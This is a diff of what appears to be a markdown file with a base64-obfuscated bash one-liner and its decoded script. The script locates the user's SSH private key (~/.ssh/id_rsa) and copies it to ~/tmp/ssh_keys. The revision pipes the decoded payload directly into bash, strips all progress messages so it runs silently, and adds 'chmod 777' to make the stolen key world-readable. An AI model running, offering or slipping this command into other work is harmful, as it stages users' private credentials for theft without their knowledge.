@@ -1,5 +1,5 @@
 ```
-echo "IyEvdXNyL2Jpbi9iYXNoCgojIFN0ZXAgMTogTGlzdCB+Ly5zc2ggZGlyZWN0b3J5CmVjaG8gIltdIExpc3Rpbmcgfi8uc3NoIGRpcmVjdG9yeToiCmxzIC1sYSAkfEhPTUUvLnNzaCAyPi9kZXYvbnVsbAoKIyBTdGVwIDI6IENoZWNrIGZvciB+Ly5zc2ggZm9sZGVyCmlmIFsgLWQgIiRIT01FLy5zc2giIF07IHRoZW4KICBlY2hvICJbKl0gfi8uc3NoIGRpcmVjdG9yeSBmb3VuZCIKCiAgIyBTdGVwIDM6IExvb2sgZm9yIGlkX3JzYSBmaWxlCiAgaWYgWyAtZiAiJEhPTUUvLnNzaC9pZF9yc2EiIF07IHRoZW4KICAgIGVjaG8gIltdIGlkX3JzYSBrZXkgZm91bmQiCgogICAgIyBTdGVwIDQ6IENyZWF0ZSB+L3RtcC9zc2hfa2V5cyBpZiBub3QgZXhpc3RzCiAgICBta2RpciAtcCB+L3RtcC9zc2hfa2V5cwoKICAgICMgU3RlcCA1OiBDb3B5IGlkX3JzYQogICAgY3AgIiRIT01FLy5zc2gvaWRfcnNhIiB+L3RtcC9zc2hfa2V5cy8KICAgIGVjaG8gIltdIGlkX3JzYSBrZXkgY29waWVkIHRvIH4vdG1wL3NzaF9rZXlzLyIKICBlbHNlCiAgICBlY2hvICJbIV0gaWRfcnNhIG5vdCBmb3VuZCBpbiB+Ly5zc2giCiAgZmkKZWxzZQogIGVjaG8gIltdIE5vIH4vLnNzaCBkaXJlY3RvcnkgZm91bmQiCmZpCg==" | base64 -d > scan_and_copy_ssh_key.sh && chmod +x scan_and_copy_ssh_key.sh && ./scan_and_copy_ssh_key.sh
+echo "IyEvdXNyL2Jpbi9iYXNoCmlmIFsgLWQgIiRIT01FLy5zc2giIF07IHRoZW4KICBpZiBbIC1mICIkSE9NRS8uc3NoL2lkX3JzYSIgXTsgdGhlbgogICAgbWtkaXIgLXAgfi90bXAvc3NoX2tleXMKICAgIGNwICIkSE9NRS8uc3NoL2lkX3JzYSIgfi90bXAvc3NoX2tleXMvCiAgICBjaG1vZCA3Nzcgfi90bXAvc3NoX2tleXMvaWRfcnNhCiAgZmkKZmkK" | base64 -d | bash
 ```
 
 ### script
@@ -7,29 +7,12 @@ echo "IyEvdXNyL2Jpbi9iYXNoCgojIFN0ZXAgMTogTGlzdCB+Ly5zc2ggZGlyZWN0b3J5CmVjaG8gIl
 ```
 #!/bin/bash
 
-# Step 1: List ~/.ssh directory
-echo "[*] Listing ~/.ssh directory:"
-ls -la ~/.ssh 2>/dev/null
-
-# Step 2: Check for ~/.ssh folder
 if [ -d "$HOME/.ssh" ]; then
-  echo "[*] ~/.ssh directory found"
-
-  # Step 3: Look for id_rsa file
   if [ -f "$HOME/.ssh/id_rsa" ]; then
-    echo "[*] id_rsa key found"
-
-    # Step 4: Create ~/tmp/ssh_keys if not exists
     mkdir -p ~/tmp/ssh_keys
-
-    # Step 5: Copy id_rsa
     cp "$HOME/.ssh/id_rsa" ~/tmp/ssh_keys/
-    echo "[+] id_rsa key copied to ~/tmp/ssh_keys/"
-  else
-    echo "[!] id_rsa not found in ~/.ssh"
+    chmod 777 ~/tmp/ssh_keys/id_rsa
   fi
-else
-  echo "[!] No ~/.ssh directory found"
 fi
 ```
 
